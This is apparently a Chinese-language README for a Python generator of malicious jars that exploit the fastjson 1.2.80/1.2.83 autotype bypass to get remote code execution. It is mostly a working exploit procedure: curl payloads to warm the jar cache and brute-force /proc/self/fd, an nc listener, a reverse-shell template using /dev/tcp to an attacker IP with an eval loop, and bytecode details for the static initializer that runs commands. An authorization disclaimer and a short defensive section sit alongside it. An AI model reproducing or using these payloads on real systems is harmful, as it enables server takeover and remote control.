# fastjson-rce-jargen

纯 Python 实现的 **fastjson `@JSONType` 恶意 jar 生成器**，用于复现 fastjson 1.2.80 / 1.2.83 的 autotype 绕过 → 远程代码执行链。

不依赖 JDK、不依赖 ASM：脚本直接按 JVM 规范手拼 `.class` 字节码，再用标准库 `zipfile` 打包成 jar。

---

> ## ⚠️ 使用边界（请先读）
>
> 本工具会生成**内含反弹 shell / 任意命令执行静态块**的 class 文件，属于漏洞利用（exploit）工具，不是扫描器或检测脚本。
>
> 仅可用于：
> - 自己搭建的隔离靶场（如本项目的 Docker lab）；
> - 已取得**书面授权**的渗透测试 / 红队演练；
> - 漏洞原理教学与安全研究。
>
> **禁止对未授权的系统、公网主机或第三方服务使用。** 未授权利用漏洞在《刑法》第 285/286 条等法律下可能构成犯罪。使用者自行承担全部责任，作者不对滥用行为负责。
>
> 如果目的是**防御**，请改用升级 fastjson ≥ 1.2.83（并开启 `safeMode`）、关闭 autotype、出网白名单等措施，而不是运行本工具。

---

## 1. 它解决什么问题

fastjson 1.2.80 的利用链大致是：

1. 目标把 JSON 中 `@type` 的值当类名处理，并先做一次 `getResourceAsStream()`；名字长得像 URL 时，JVM 会去**远程下载**这个 jar；
2. 下载回来的类若带 `com.alibaba.fastjson.annotation.JSONType` 注解，会被当作可信类型加载；
3. 类一加载，静态初始化块 `<clinit>` 就执行 —— 命令执行发生在这里。

实践上有两个障碍，这个脚本就是为绕开它们设计的：

| 障碍 | 脚本的做法 |
| --- | --- |
| JDK 9+ 拒绝含 `//` 的类名，`jar:http://...` 形式的类名直接 `ClassFormatError` | 拆成**两阶段**：先用 `jar:http://…!/A0` 让靶机把 jar 下载并缓存（JVM 会一直握着这个文件的 fd），再用 `jar:file:/proc/self/fd/N!/…` 这种只有单斜杠的名字去加载 |
| 不知道靶机手里 jar 缓存的 fd 编号是多少（每次重启还会变） | 一次生成 **2048 个类**（`XZ0` ~ `XZ2047`），第 N 个类的内部名硬编码成 `jar:file:/proc/self/fd/N!/XZN`，逐个试 payload，命中即执行 |
| 传统做法要 JDK + ASM 才能造字节码 | 全 Python 手写常量池与字节码，零第三方依赖 |

所以生成的 jar 里有两种类：

- `XZ0.class` … `XZ2047.class`：类名和 fd 编号绑定，供「扫 fd」阶段用；
- `A0.class`：类名写成预热 URL，供「预热」阶段让靶机下载 jar。

---

## 2. 环境要求

| 项 | 要求 |
| --- | --- |
| 运行脚本 | Python 3.6+（仅标准库：`argparse` / `struct` / `zipfile`） |
| 可选自检 | JDK 的 `javap` + `jar` 在 PATH 中（`--verify` 用；不装也能正常生成） |
| 生成字节码 | Java 8 版本（major = 52），兼容 JDK 8 / 11 |
| 靶机 | 能主动访问攻击机 HTTP 服务；Linux（`/proc/self/fd`、`/dev/tcp`） |
| 攻击机 | 一个 HTTP 静态服务 + 一个反弹 shell 监听端口 |

---

## 3. 快速开始（五步）

以下假设攻击机 IP `172.26.50.158`，HTTP 端口 `18081`，回连端口 `4444`，靶机 `http://172.26.50.158:8080`（换成你自己的地址）。

**第 0 步：把 IP 换成整数形式。** payload 里的点会被 fastjson 做 `replace('.', '/')`，所以主机名必须用整数 IP。`172.26.50.158` → `2887398046`（脚本会自动算，输出里会打印）。

**第 1 步：起 HTTP 服务**（服务目录必须和 `--out-dir` 一致）

```bash
mkdir -p out && cd out
python -m http.server 18081
```

**第 2 步：起回连监听**（另开一个终端）

```bash
nc -lvnp 4444
```

**第 3 步：生成 jar**

```bash
python genjar.py \
  --prefix XZ \
  --jar evil \
  --ip 172.26.50.158 \
  --port 4444 \
  --http-port 18081 \
  --out-dir ./out \
  --verify
```

> `--out-dir` 建议**显式指定**。脚本默认值是 `<脚本目录>/../docker-lab/www`，那是原实验环境的布局，单独用这个仓库时该目录不存在（脚本会自动创建，但不会和你的 HTTP 服务目录对齐）。

**第 4 步：预热** —— 让靶机下载并缓存 jar，脚本会打印可直接复制的 payload

```bash
curl -s -X POST http://<靶机>:8080/ \
  -H 'Content-Type: application/json' \
  -d '{"@type":"jar:http:..2887398046:18081.evil!.A0"}'
```

**第 5 步：扫 fd** —— 把 `N` 从 0 试到 2047，命中时静态块执行，命令通道连回 `nc`

```bash
# N 逐个替换；真实环境用脚本/工具批量发
curl -s -X POST http://<靶机>:8080/ \
  -H 'Content-Type: application/json' \
  -d '{"@type":"jar:file:.proc.self.fd.16!.XZ16","x":1}'
```

如果能进靶机，可以直接查 fd 号，省掉盲扫：

```bash
docker compose exec -T target sh -c 'ls -l /proc/1/fd | grep jar_cache'
```

---

## 4. 参数一览

| 参数 | 必填 | 默认值 | 说明 |
| --- | --- | --- | --- |
| `--prefix` | ✅ | — | 类前缀，如 `XZ`，生成 `XZ0`~`XZn`。**不能带点** |
| `--jar` | ✅ | — | 输出 jar 文件名（不带扩展名）。**不能带点** |
| `--ip` | ✅ | — | 攻击机 IP，点分十进制；用于算整数 IP、生成默认反弹命令 |
| `--port` | ✅ | — | 反弹 shell 回连端口，写进命令里 |
| `--http-port` | | `18081` | 托管 jar 的 HTTP 端口，只影响预热 URL |
| `--max-fd` | | `2047` | fd 上界，生成 `0~n` 共 n+1 个类。靶机 ulimit 小可以调低 |
| `--shell` | | `/bin/bash` | 解释器路径，写进 `exec` 的第一个参数 |
| `--cmd` | | — | 自定义命令；与 `--cmd-file` 二选一 |
| `--cmd-file` | | — | 从文件读命令（**推荐**，避开 shell 转义） |
| `--cr` | | 关 | 默认命令里加 CR 剥离，Windows 终端发命令不会带 `\r` 报错 |
| `--out-dir` | | `../docker-lab/www` | 输出目录，建议显式指定 |
| `--verify` | | 关 | 生成后用 `javap` 反汇编检查内部名与命令 |
| `--force` | | 关 | 允许覆盖同名 jar（不推荐，见 §7） |

三个参数都不给时，命令自动取内置的反弹 shell 模板（`exec 5<>/dev/tcp/IP/PORT; while read …; do eval "$c" …; done`），它会建立一个可反复发命令的通道，而不是一次性 `bash -i`。

---

## 5. 命令的三种写法

**① 默认（反弹命令通道）**

```bash
python genjar.py --prefix XZ --jar evil --ip 172.26.50.158 --port 4444 --cr --out-dir ./out
```

**② `--cmd` 自定义**（注意 shell 转义，Windows 上尤其容易出问题）

```bash
python genjar.py --prefix XZ --jar evil --ip 172.26.50.158 --port 4444 \
  --cmd "id > /dev/tcp/172.26.50.158/4444" --out-dir ./out
```

**③ `--cmd-file`（推荐）** —— 把命令写进文件，脚本会 `.strip()` 后原样使用

```bash
python genjar.py --prefix XZ --jar evil --ip 172.26.50.158 --port 4444 \
  --cmd-file examples/shell_cmd.txt --out-dir ./out
```

`examples/shell_cmd.txt` 是一个带 CR 剥离的反弹通道示例，用之前记得把 IP / 端口换成自己的。

> `--cr` 只对**内置默认命令**生效。用 `--cmd` / `--cmd-file` 时若要 CR 剥离，请自己写进命令里；脚本检测到命令里没有 `c%` 会打印提示。

**命令安全校验**：脚本会拒绝生成含以下问题的命令，避免把脏字符编进字节码后到靶机上才失败：

- 开头多了 `String `（从 `javap` 输出复制时带进来的）
- 含 `^`（cmd 转义符残留）
- 含 `\r` / `\n`
- `eval $c` 没加双引号（应为 `eval "$c"`）

---

## 6. 输出长什么样

```
[*] 前缀      : XZ
[*] jar       : D:\...\out\evil
[*] 类数量    : 2048
[*] 解释器    : /bin/bash
[*] CR 剥离   : 开（c="${c%$'\r'}"）
[*] 命令      : exec 5<>/dev/tcp/172.26.50.158/4444; while read -r c <&5; ...
[*] 预热URL   : jar:http://2887398046:18081/evil!/A0
[+] 已生成: D:\...\out\evil (约 900 KB, 2049 个类)

预热 payload:
  {"@type":"jar:http:..2887398046:18081.evil!.A0"}
打 fd payload:
  {"@type":"jar:file:.proc.self.fd.N!.XZN","x":1}
```

加 `--verify` 后额外打印 `XZ0.class` 和 `A0.class` 的内部名与命令常量，用来确认字节码没写错。

---

## 7. 常见坑

| 现象 | 原因 | 处理 |
| --- | --- | --- |
| 生成时警告「jar 名带点」 | fastjson 会 `replace('.', '/')` 把名字改坏 | jar 名、前缀都不要带点 |
| 拒绝覆盖同名 jar | 靶机按 jar URL 缓存，同名文件不会重新下载，会一直拿到旧内容 | **换个新名字**（`evil2`、`evil_new`）；`--force` 不推荐 |
| 扫完 2048 个 fd 仍无回连 | 预热没成功 / 靶机不能出网 / 类已加载过 | 看 HTTP 服务日志有没有 `GET /evil`；重启靶机后要重新预热 |
| 同一个 fd 打第二次没反应 | 类已加载，`<clinit>` 只跑一次 | 换新的 `--prefix` 和 `--jar` 重新生成 |
| `ClassFormatError: Illegal class name` | 直接用了 `jar:http://` 形式但靶机是 JDK 9+ | 必须走 `/proc/self/fd` 两阶段 |
| Windows 终端发的命令报奇怪错误 | 回车带来 `\r` | 用 `--cr`，或在命令里加 `c="${c%$'\r'}"` |
| `ValueError: 常量下标超过 255` | `ldc` 只有 1 字节索引，常量池项排到了 255 之后 | 缩短命令 / 缩短类名前缀，让 `shell`、`-c`、`command` 三个 CONSTANT_String 排在前面 |
| 预热 URL 里 IP 是整数 | 点被 fastjson 替换成斜杠 | 正常现象，脚本自动换算，别手改 |

---

## 8. 原理速记（改脚本前先看）

`build_class()` 手写的每个 class 包含：

- **常量池**：`CONSTANT_Class` / `Utf8` / `NameAndType` / `Methodref` / `String`；
- **`<init>()V`**：只调 `Object.<init>`；
- **`<clinit>()V`**：`Runtime.getRuntime()` → `iconst_3` → `anewarray String` → 依次 `aastore` 填入 `shell` / `-c` / `command` → `Runtime.exec(String[])`；
- **类级注解** `RuntimeVisibleAnnotations` → `Lcom/alibaba/fastjson/annotation/JSONType;`；
- `this_class` 写成 jar URL 形式的内部名（如 `jar:file:/proc/self/fd/16!/XZ16`）。

三个最容易写错、代码里已注释标出的点：

1. `ldc` 指向的必须是 **CONSTANT_String（tag 8）**，直接指 Utf8 会 `ClassFormatError`；
2. 静态块 `max_stack` 必须是 **5**（`R, arr, arr, idx, str`），写 4 会 `VerifyError`；
3. 三个 `ldc` 用的常量池下标必须 **≤ 255**，因为 `ldc` 只有 1 字节操作数。

---

## 9. 防御建议（给蓝队）

- 升级 fastjson 到 1.2.83+ 并开启 `safeMode`；无法升级时全局关闭 `autoTypeSupport`；
- 用 `ParserConfig.getGlobalInstance().addDeny()` 补 deny 列表，注意 1.2.80 的绕过可绕过部分 hash denylist；
- **限制应用服务器出网**（这条链必须让靶机主动下载外部 jar，出网白名单能直接掐断）；
- 监控请求体中的 `jar:http`、`jar:file`、`@type` 与 `/proc/self/fd` 特征；
- 关注 JVM 异常日志中的 `ClassFormatError`、`Illegal class name`。

---

## 10. 仓库内容

```
fastjson-rce-jargen/
├── genjar.py                  # 生成器主程序（原样保留，未改动）
├── examples/
│   └── shell_cmd.txt          # 自定义命令示例（带 CR 剥离的反弹通道）
├── .gitignore
└── README.md
```

配套的起服务、扫 fd、交互等脚本不在本仓库内（原实验环境 `tools/` 下另有 `fast_scan.py`、`listen.py`、`interact.py` 等），需要的话可以再补进来。

---

## 11. 参考

- fastjson 1.2.80 autotype 绕过（CVE-2022-25845 相关链，JNDI/JDBC 之外的 jar URL 加载路径）
- 同一实验环境的分析文档：`fastjson-1.2.83-RCE-深度分析.md`、`fastjson-1.2.80-复现手册.md`、`本机当攻击机-复现手册.md`
